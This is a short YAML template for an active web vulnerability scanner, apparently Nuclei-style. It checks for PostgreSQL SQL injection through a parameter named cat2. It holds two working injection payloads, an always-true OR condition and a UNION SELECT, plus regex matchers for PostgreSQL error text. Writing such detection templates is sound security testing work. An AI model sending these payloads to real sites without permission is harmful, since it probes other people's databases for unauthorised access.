id: sqli3-pg-11
name: 'SQLi pg prefix #10 in cat2'
severity: high
type: active
tags:
  - sqli
  - injection
  - pg
description: 'Triggers pg error via cat2'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      cat2:
        - '''))) OR (((''1''=''1'
        - ''') UNION SELECT 1,2--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'PostgreSQL'
          - 'pg_query'
